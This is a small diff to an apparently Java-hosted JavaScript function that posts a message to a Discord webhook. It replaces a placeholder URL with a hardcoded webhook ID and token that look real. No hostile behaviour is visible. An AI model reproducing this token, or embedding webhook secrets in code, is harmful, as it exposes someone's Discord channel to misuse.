@@ -5,7 +5,7 @@ var StringBuilder = Java.type('java.lang.StringBuilder');
 
 function sendDiscordMessage() {
     try {
-        var webhookUrl = "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token"; // Replace with your Discord webhook URL
+        var webhookUrl = "https://discord.com/api/webhooks/1397869568319291515/6O_Zciy0jmpsQAbQtm82L6m-diLhrc3ib9QdDKH4sFtYu3XoAXXiEGnmK4ujPQL20iyl"; // Replace with your Discord webhook URL
         var url = new URL(webhookUrl);
         var conn = url.openConnection();
         conn.setRequestMethod("POST");
